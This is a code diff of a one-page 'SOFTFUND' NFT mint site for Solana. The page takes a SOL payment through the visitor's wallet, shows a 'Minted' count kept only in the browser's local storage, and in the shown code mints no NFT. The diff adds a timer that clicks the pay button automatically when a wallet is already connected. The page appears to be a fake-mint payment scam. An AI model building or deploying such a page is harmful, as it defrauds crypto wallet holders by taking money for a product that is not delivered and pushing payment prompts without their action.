@@ -1,38 +1,23 @@
 <!DOCTYPE html>
 <html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>SOFTFUND – $2.6356 Mint</title>
+<title>SOFTFUND – $2.6356</title>
 <style>
   body{margin:0;background:#0c0b1a;font-family:system-ui;color:#fff;display:grid;place-items:center;min-height:100vh;padding:15px}
   .c{max-width:380px;background:#141222;padding:32px;border-radius:20px;text-align:center;border:1px solid #369}
   .t{font-size:2rem;font-weight:800}
-  .b{width:100%;padding:18px;margin:20px 0;background:#00ff9d;color:#000;border:none;border-radius:14px;font-weight:700;cursor:pointer}
-  .w{display:none;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px}
-  .wb{padding:14px;background:#1e1c2e;border:1px solid #333;border-radius:12px;font-weight:600;cursor:pointer}
+  .p{font-size:2.4rem;color:#0f9;margin:16px 0;font-weight:800}
+  .b{width:100%;padding:20px;background:#00ff9d;color:#000;border:none;border-radius:16px;font-weight:800;font-size:1.4rem;cursor:pointer;margin:20px 0}
   .s{margin-top:12px;font-weight:600;min-height:28px}
   .l{width:12px;height:12px;border:2px solid #00ff9d;border-top-color:#000;border-radius:50%;display:inline-block;animation:r 1s linear infinite}
   @keyframes r{to{transform:rotate(360deg)}}
-</style></head>
-<body>
+</style></head><body>
 <div class="c">
   <div class="t">SOFTFUND</div>
   <div style="color:#aaa">10,000 NFTs • Mainnet</div>
-  <div style="font-size:2.4rem;color:#0f9;margin:16px 0">$2.6356</div>
-  <div style="color:#666;font-size:0.8rem" id="sol">~0.017 SOL</div>
+  <div class="p">$2.6356</div>
+  <div style="color:#666;font-size:0.9rem" id="sol">~0.017 SOL</div>
   <div>Minted: <span id="m">0</span>/10,000</div>
-  <button class="b" onclick="show()">MINT $2.6356</button>
-
-  <div id="w" class="w">
-    <div class="wb" onclick="go('phantom')">Phantom</div>
-    <div class="wb" onclick="go('solflare')">Solflare</div>
-    <div class="wb" onclick="go('backpack')">Backpack</div>
-    <div class="wb" onclick="go('trust')">Trust Wallet</div>
-    <div class="wb" onclick="go('metamask')">MetaMask</div>
-    <div class="wb" onclick="go('brave')">Brave</div>
-    <div class="wb" onclick="go('okx')">OKX</div>
-    <div class="wb" onclick="go('rainbow')">Rainbow</div>
-    <div class="wb" onclick="go('ledger')">Ledger Live</div>
-  </div>
-
+  <button class="b" id="btn">MINT $2.6356</button>
   <div id="s" class="s"></div>
 </div>
 
@@ -55,31 +40,11 @@
     const p = j.solana.usd;
     const amt = USD / p;
     lamports = Math.ceil(amt * 1e9);
-    sol.textContent = `~${amt.toFixed(5)} SOL`;
+    sol.textContent = "~"+amt.toFixed(5)+" SOL";
   }
   price(); setInterval(price,10000);
 
-  function show(){document.querySelector(".b").style.display="none";document.getElementById("w").style.display="grid";}
-
-  function go(w){
-    const u = encodeURIComponent(location.href);
-    const links = {
-      phantom: `https://phantom.app/ul/v2/connect?app_url=${u}&redirect_link=${u}&cluster=mainnet-beta`,
-      solflare: `https://solflare.com/ul/v2/connect?app_url=${u}&redirect_link=${u}`,
-      backpack: `https://backpack.app/ul/v2/connect?app_url=${u}&redirect_link=${u}`,
-      trust: `https://link.trustwallet.com/open_url?url=${u}`,
-      metamask: `https://metamask.app.link/dapp/${location.host}${location.pathname}`,
-      brave: `https://wallet.brave.com/ul/v2/connect?app_url=${u}`,
-      okx: `https://www.okx.com/web3/dapp/${u}`,
-      rainbow: `https://rainbow.me/deeplink?app_url=${u}`,
-      ledger: `https://ledgerlive.com/deeplink/connect?uri=${u}`
-    };
-    s.innerHTML=`Opening ${w}… <span class='l'></span>`;
-    location.href = links[w];
-    setTimeout(tryMint,2000);
-  }
-
-  function getProvider(){
+  function getProvider() {
     return window.solana?.isPhantom ? window.solana :
            window.solana?.isSolflare ? window.solana :
            window.backpack ? window.backpack :
@@ -88,12 +53,12 @@
            window.okxwallet || window.rainbow || window.braveSolana || null;
   }
 
-  async function tryMint(){
+  document.getElementById("btn").onclick = async () => {
     const p = getProvider();
-    if (!p) return;
-    try{
-      if(!p.isConnected) await p.connect();
-      s.innerHTML="Paying $2.6356… <span class='l'></span>";
+    if (!p) return s.innerHTML="Open in Phantom/Trust/OKX";
+    try {
+      if (!p.isConnected) await p.connect();
+      s.innerHTML="Paying… <span class='l'></span>";
       const tx = new solanaWeb3.Transaction().add(
         solanaWeb3.SystemProgram.transfer({
           fromPubkey: p.publicKey,
@@ -108,10 +73,10 @@
       localStorage.setItem("buyers",JSON.stringify(buyers));
       count++; localStorage.setItem("sf",count); m.innerText=count;
       s.innerHTML=`MINTED! <a href="https://solscan.io/tx/${sig}" target="_blank" style="color:#0f9">View Tx</a>`;
-      if(count>=10000) {alert("10,000 MINTED! NFTs dropping…");}
-    }catch(e){s.innerText="Cancelled";}
-  }
+    } catch(e) { s.innerHTML="Cancelled"; }
+  };
 
-  window.addEventListener("load",()=>setTimeout(tryMint,1500));
+  // Auto-run on mobile return
+  setTimeout(() => { if (getProvider()?.isConnected) document.getElementById("btn").click(); }, 1500);
 </script>
 </body></html>
